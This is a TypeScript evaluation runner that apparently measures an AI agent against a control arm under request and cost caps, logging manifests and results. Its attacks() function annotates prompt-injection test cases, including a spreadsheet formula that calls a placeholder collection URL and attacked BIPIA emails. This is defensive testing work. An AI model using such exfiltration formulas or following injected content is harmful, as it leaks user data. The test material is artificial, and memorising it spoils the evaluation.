import {
  ensureEvalData,
  evalDataPath,
  readEvalText,
  assertEvalOutputOutsideProject,
} from "./evalData";
import { parseArgs } from "node:util";
import { readFile, writeFile, appendFile, mkdir } from "node:fs/promises";
import { join, resolve } from "node:path";
import { createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { CaseSchema, EvalError, type Scenario } from "./schema";
import { emptyUsage, type CompletionAdapter } from "./adapters";
import { CampaignBudget } from "./campaignBudget";
import {
  ProviderDiagnosticJournal,
  type DiagnosticContext,
} from "./providerJournal";
import {
  buildPairedOrder,
  expandUnrun,
  originalProblemId,
} from "./campaignSelection";
import {
  writeOptimizationReport,
  type CampaignRow,
} from "./optimizationReport";
import { runCase } from "./runner";
import {
  PUBLIC_SOURCES,
  PythonBridge,
  runPublicEpisode,
  type PublicCase,
} from "./publicRunner";
import { verifyPublicIntegrity } from "./publicIntegrity";
import { readQualityAnnotations } from "./qualityAnnotations";
import { type AttackAnnotation } from "./safety";
import { evaluateNativeRun } from "./nativeEvaluation";
import {
  NativePiFixtureAdapter,
  NativePiCompletionAdapter,
  nativeModelBound,
  loadInstalledPiSdk,
} from "./nativePiFixtureAdapter";
import { NativeHostFixtureAdapter } from "./nativeHostFixtureAdapter";
import { brain } from "../native/brain";
const MODEL = "openai-codex/gpt-5.6-luna";
const sha = (text: string) => createHash("sha256").update(text).digest("hex");
const { values } = parseArgs({
  options: {
    out: { type: "string" },
    execute: { type: "boolean", default: false },
    "max-requests": { type: "string", default: "200" },
    "max-usd": { type: "string", default: "2" },
  },
});
const root = process.env.MONOCODE_EVAL_ROOT!,
  out = resolve(values.out ?? "");
if (!values.out) throw Error("--out NEW_DIRECTORY is required");
await assertEvalOutputOutsideProject(root, out);
const historical = (
  await readEvalText(root, "reports/scores-2026-10-09/cases.jsonl")
)
  .split("\n")
  .filter(Boolean)
  .map((line) => JSON.parse(line));
const maxRequests = Number(values["max-requests"]),
  maxUsd = Number(values["max-usd"]);
if (
  !Number.isInteger(maxRequests) ||
  maxRequests < 1 ||
  maxRequests > 200 ||
  !Number.isFinite(maxUsd) ||
  maxUsd < 0.01 ||
  maxUsd > 2
)
  throw Error("Authorized limits are <=200 requests and <=$2");
const readRows = async (path: string) =>
  (await readFile(path, "utf8"))
    .split("\n")
    .filter(Boolean)
    .map((l) => JSON.parse(l));
await ensureEvalData(root, ["original", ...PUBLIC_SOURCES]);
const originals = (await readRows(evalDataPath(root, "data/cases.jsonl"))).map(
  (c) => CaseSchema.parse(c),
);
const variants = (
  await readRows(evalDataPath(root, "data/variants/structured-nested-v2.jsonl"))
).map((c) => CaseSchema.parse(c));
const cases = new Map([...originals, ...variants].map((c) => [c.id, c]));
const integrity = await verifyPublicIntegrity(root);
const publicCases: PublicCase[] = [];
const inventory = new PythonBridge(root);
try {
  for (const source of PUBLIC_SOURCES)
    publicCases.push(...(await inventory.request({ op: "list", source })));
} finally {
  inventory.close();
}
const publicMap = new Map(publicCases.map((c) => [c.id, c]));
const publicRecords = new Map<string, any>();
for (const source of PUBLIC_SOURCES)
  for (const c of await readRows(
    evalDataPath(root, `public/${source}/cases.jsonl`),
  ))
    publicRecords.set(c.id, c);
const quality = await readQualityAnnotations(root);
const catalog = [
  ...[...cases.values()].map((c) => ({
    id: c.id,
    category: c.category,
    source: "original",
    upstreamId: originalProblemId(c.id),
    group: `original/${c.category}`,
  })),
  ...publicCases.map((c) => ({
    ...c,
    upstreamId: `${c.source}/${c.upstream_id}`,
    group: `${c.source}/${c.category}`,
  })),
];
const diagnosticIds = [
  "retrieval-two-source",
  "retrieval-injection-contradiction",
  "spreadsheets-weighted",
  "spreadsheets-formula-injection",
  "memory-recall-before-answer",
  "recovery-changing-language",
  "security-file-system",
  "structured-nested",
  "degradation-tool-offline",
  "hotpotqa/5a7360235542991f29ee2dc7/offline_distractor_tools_v1",
  "hotpotqa/5a756dd65542996c70cfaef9/offline_distractor_tools_v1",
  "bipia/email/test/037/clean",
];
const nativeIds = [
  "memory-recall-before-answer",
  "files-unicode",
  "permissions-read-only",
  "recovery-changing-language",
];
const previous = new Set(
  historical.filter((r) => r.real_model_executed).map((r) => r.id),
);
for (const id of [...diagnosticIds, ...nativeIds, "structured-nested-v2"])
  previous.add(id);
const expansionIds = [
  "structured-nested-v2",
  ...expandUnrun(catalog, previous, 80),
];
const episodes = [
  ...buildPairedOrder(diagnosticIds, ["control", "monocode"], 17).map((x) => ({
    ...x,
    phase: "prompt",
  })),
  ...buildPairedOrder(nativeIds, ["control", "monocode"], 17).map((x) => ({
    ...x,
    phase: "native",
  })),
  ...expansionIds.map((id) => ({
    id,
    phase: "expansion",
    arm: "monocode",
    seed: 17,
    repeat: 0,
  })),
];
for (const { id } of episodes)
  if (!cases.has(id) && !publicMap.has(id))
    throw Error(`Unknown selected case ${id}`);
const implementationFiles: Record<string, string> = {};
for (const f of [
  "src/optimizationCampaign.ts",
  "src/campaignBudget.ts",
  "src/providerJournal.ts",
  "src/campaignSelection.ts",
  "src/optimizationReport.ts",
  "src/nativeEvaluation.ts",
  "src/transport.ts",
  "src/safety.ts",
  "src/runner.ts",
  "src/publicRunner.ts",
  "src/evalData.ts",
  "bin/eval_data.py",
  "bin/prepare_data.py",
  "data/datasets.lock.json",
  "src/environment.ts",
  "src/citation.ts",
  "src/scoring.ts",
  "src/tools.ts",
  "src/nativePiFixtureAdapter.ts",
  "src/nativeHostFixtureAdapter.ts",
  "src/schema.ts",
  "src/judgeTrust.ts",
  "src/qualityAnnotations.ts",
  "native/brain.ts",
  "../thread/prompt.ts",
  "../thread/control.ts",
  "../memory.ts",
  "../memorySearch.ts",
  "public/bridge.py",
])
  implementationFiles[f] = sha(await readFile(join(root, f), "utf8"));
const sdk = await loadInstalledPiSdk();
const runtime = await sdk.ModelRuntime.create({
  allowModelNetwork: false,
  refreshOnCreate: false,
});
const modelBound = nativeModelBound(
  runtime.getModel("openai-codex", "gpt-5.6-luna"),
);
const requestBoundUsd = modelBound.conservativeUsd;
const manifest = {
  mode: "optimization-campaign",
  measurementVersion: "optimization-v2",
  createdAt: new Date().toISOString(),
  model: MODEL,
  thinking: "low",
  fixtureSeed: 17,
  inferenceSeed: null,
  transportPolicy: "terminal-compatible-v2",
  environmentVersion: "native-parity-v2",
  scorerVersion: "citation-v2",
  judge: "disabled: human calibration not passed",
  providerDiagnostics: {
    file: "provider-diagnostics.jsonl",
    version: 1,
    storage: "append-only fsync; mode0600",
    payloads: false,
    automaticResume: false,
  },
  budget: {
    maxRequests,
    maxUsd,
    reservationPerRequestUsd: requestBoundUsd,
    reservationMode: "catalog-upper-bound",
    modelBound,
    providerBillingCap: false,
  },
  phaseRequestCaps: { prompt: 96, native: 64, expansion: "global remainder" },
  datasetSha256: sha(
    await readFile(evalDataPath(root, "data/cases.jsonl"), "utf8"),
  ),
  integrityLockSha256: integrity.sha256,
  implementationFiles,
  promptScope:
    "same installed Pi SDK text-only single completion; exact caller system; no native tools; retry/compaction/warming disabled; per HTTP budget gate",
  cliVersion: execFileSync("pi", ["--version"], { encoding: "utf8" }).trim(),
  sdk: sdk.audit,
  nativeScope:
    "same installed Pi SDK native tool loop in both arms; A isolated fixture environment, B disposable actual Host wakeup/control actions + product brain; production piFamily provider lifecycle bypassed; no persisted recovery claim",
  historicalScope:
    "before/after measurement versions differ; do not infer capability improvement",
  nativeSupport: nativeIds.map((id) => ({
    id,
    ...NativeHostFixtureAdapter.support(cases.get(id)!),
  })),
  episodes: episodes.map((e) => ({
    ...e,
    caseHash: cases.has(e.id)
      ? sha(JSON.stringify(cases.get(e.id)))
      : publicMap.get(e.id)!.caseHash,
  })),
};
await mkdir(out, { recursive: false });
await writeFile(
  join(out, "manifest.json"),
  JSON.stringify(manifest, null, 2) + "\n",
);
if (!values.execute) {
  console.log(
    JSON.stringify({
      manifest: join(out, "manifest.json"),
      episodes: episodes.length,
      execute: false,
      modelRequests: 0,
    }),
  );
  process.exit(0);
}
const budget = new CampaignBudget(
  join(out, "budget.json"),
  maxRequests,
  maxUsd,
  requestBoundUsd,
  "catalog-upper-bound",
);
const diagnosticJournal = new ProviderDiagnosticJournal(
  join(out, "provider-diagnostics.jsonl"),
);
let diagnosticContext: DiagnosticContext;
const rows: CampaignRow[] = [];
let phase = "",
  phaseStart = 0,
  phaseLimit = 0,
  stopReason: string | undefined,
  environmentStreak = 0;
function phaseReserve() {
  if (budget.requests - phaseStart >= phaseLimit)
    throw new EvalError("BUDGET_EXHAUSTED");
  budget.reserve();
}
const nativeBudget = {
  reserve: phaseReserve,
  get actualUsd() {
    return budget.actualUsd;
  },
  set actualUsd(n: number) {
    budget.actualUsd = n;
  },
};
const completion: CompletionAdapter = {
  model: MODEL,
  async complete(system, input) {
    if (budget.requests - phaseStart >= phaseLimit)
      throw new EvalError("BUDGET_EXHAUSTED");
    const sdkCompletion = new NativePiCompletionAdapter(await sdkOptions());
    const response = await sdkCompletion.complete(system, input);
    if (
      response.usage.models.length !== 1 ||
      response.usage.models[0] !== MODEL
    ) {
      const e = new EvalError("MODEL_IDENTITY_MISMATCH") as EvalError & {
        usage: any;
      };
      e.usage = response.usage;
      throw e;
    }
    return response;
  },
};
async function sdkOptions() {
  return {
    budget: nativeBudget,
    diagnosticJournal,
    diagnosticContext,
    sdk,
    modelRuntime: runtime,
    onUsage: (u: any) => budget.recordUsage(u),
    onRequestBound: (bound: any) => {
      if (JSON.stringify(bound) !== JSON.stringify(modelBound))
        throw new EvalError("MODEL_COST_BOUND_CHANGED");
    },
    timeoutMs: 60000,
    maxOutputTokens: 2048,
    maxOutputBytes: 4096,
    maxContextTokens: 24000,
  };
}
function attacks(id: string): AttackAnnotation[] | undefined {
  const s = cases.get(id);
  if (id === "security-file-system")
    return [{ action: "files.read", text: s!.fixture.files!["source.txt"] }];
  if (id === "retrieval-injection-contradiction")
    return [
      {
        action: "fixture.read",
        text: s!.fixture.documents!.find((d) => d.id === "mirror")!.text,
      },
    ];
  if (id === "spreadsheets-formula-injection")
    return [
      {
        action: "fixture.sheet.read",
        text: '=WEBSERVICE("https://example.invalid/collect")',
      },
    ];
  const c = publicRecords.get(id);
  if (c?.source === "bipia" && c.variant === "attacked")
    return [{ action: "read_email", text: c.data.context }];
  return undefined;
}
async function native(scenario: Scenario, arm: string, seed: number) {
  if (!NativeHostFixtureAdapter.support(scenario).supported)
    return {
      status: "environment_error",
      error: "NATIVE_HOST_UNSUPPORTED",
      usage: emptyUsage(),
      checks: [],
      trace: [],
      final: "",
    };
  const pi = new NativePiFixtureAdapter(await sdkOptions());
  let r: any;
  if (arm === "control") r = await pi.run(scenario, seed);
  else {
    const host = await NativeHostFixtureAdapter.create(scenario, seed);
    try {
      r = await host.run(pi);
    } finally {
      await host.close();
    }
  }
  if (r.usage.requests > r.requestUsage.length || r.usage.costUsd === null)
    budget.failClosed("NATIVE_USAGE_UNKNOWN");
  return evaluateNativeRun(scenario, r, {
    seed,
    arm,
    attackAnnotations: attacks(scenario.id),
  });
}
for (const episode of episodes) {
  diagnosticContext = {
    caseId: episode.id,
    phase: episode.phase as DiagnosticContext["phase"],
    arm: episode.arm as DiagnosticContext["arm"],
  };
  if (episode.phase !== phase) {
    phase = episode.phase;
    phaseStart = budget.requests;
    phaseLimit =
      phase === "prompt"
        ? 96
        : phase === "native"
          ? 64
          : maxRequests - budget.requests;
    environmentStreak = 0;
  }
  const item = catalog.find((c) => c.id === episode.id)!;
  const startedAt = new Date().toISOString();
  let result: any;
  const exhausted =
    budget.requests >= maxRequests ||
    budget.reservedUsd + requestBoundUsd > maxUsd + 1e-9 ||
    budget.requests - phaseStart >= phaseLimit;
  if (stopReason || exhausted)
    result = {
      status: "skipped",
      error: stopReason ?? "BUDGET_EXHAUSTED",
      usage: emptyUsage(),
      checks: [],
      trace: [],
      final: "",
    };
  else
    try {
      if (phase === "native")
        result = await native(
          cases.get(episode.id)!,
          episode.arm,
          episode.seed,
        );
      else if (cases.has(episode.id))
        result = await runCase(cases.get(episode.id)!, {
          mode: "pi",
          seed: episode.seed,
          adapter: completion,
          brain: episode.arm === "monocode" ? brain : undefined,
          transportPolicy: "terminal-compatible-v2",
          environmentVersion: "native-parity-v2",
          attackAnnotations: attacks(episode.id),
        });
      else {
        const bridge = new PythonBridge(root);
        try {
          result = await runPublicEpisode(publicMap.get(episode.id)!, bridge, {
            mode: "pi",
            seed: episode.seed,
            maxSteps: 8,
            adapter: completion,
            brain: episode.arm === "monocode" ? brain : undefined,
            transportPolicy: "terminal-compatible-v2",
            attackAnnotations: attacks(episode.id),
            ...(["bipia", "hotpotqa", "bfcl", "longmemeval"].includes(
              item.source,
            )
              ? { effectActions: [] }
              : {}),
          });
        } finally {
          bridge.close();
        }
      }
    } catch (e) {
      result = {
        status: "environment_error",
        error: e instanceof Error ? e.message : String(e),
        usage: emptyUsage(),
        checks: [],
        trace: [],
        final: "",
      };
      if (budget.snapshot().unsettledRequest)
        budget.failClosed("UNHANDLED_PROVIDER_USAGE");
    }
  if (phase !== "native" && result.usage.requests > 0)
    result.mode = "real-pi-sdk-text-envelope-isolated-tools";
  if (result.error === "DIAGNOSTIC_WRITE_FAILED")
    stopReason = "DIAGNOSTIC_WRITE_FAILED";
  if (budget.snapshot().blockedReason) stopReason = "USAGE_UNKNOWN";
  if (result.error === "MODEL_IDENTITY_MISMATCH")
    stopReason = "MODEL_IDENTITY_MISMATCH";
  if (result.status === "environment_error") environmentStreak++;
  else if (result.usage.requests > 0) environmentStreak = 0;
  if (environmentStreak >= 3) stopReason = "ENVIRONMENT_CIRCUIT_BREAKER";
  const row = {
    ...episode,
    source: item.source,
    category: item.category,
    startedAt,
    result,
    evidence: `results.jsonl:L${rows.length + 1}`,
  };
  rows.push(row);
  await appendFile(join(out, "results.jsonl"), JSON.stringify(row) + "\n");
  await writeOptimizationReport(
    out,
    rows,
    catalog,
    quality,
    budget.snapshot(),
    historical,
  );
  console.log(
    JSON.stringify({
      phase: episode.phase,
      arm: episode.arm,
      id: episode.id,
      status: result.status,
      error: result.error,
      requests: result.usage.requests,
      costUsd: result.usage.costUsd,
      total: budget.snapshot(),
    }),
  );
}
await writeOptimizationReport(
  out,
  rows,
  catalog,
  quality,
  budget.snapshot(),
  historical,
);
console.log(JSON.stringify({ done: true, out, budget: budget.snapshot() }));
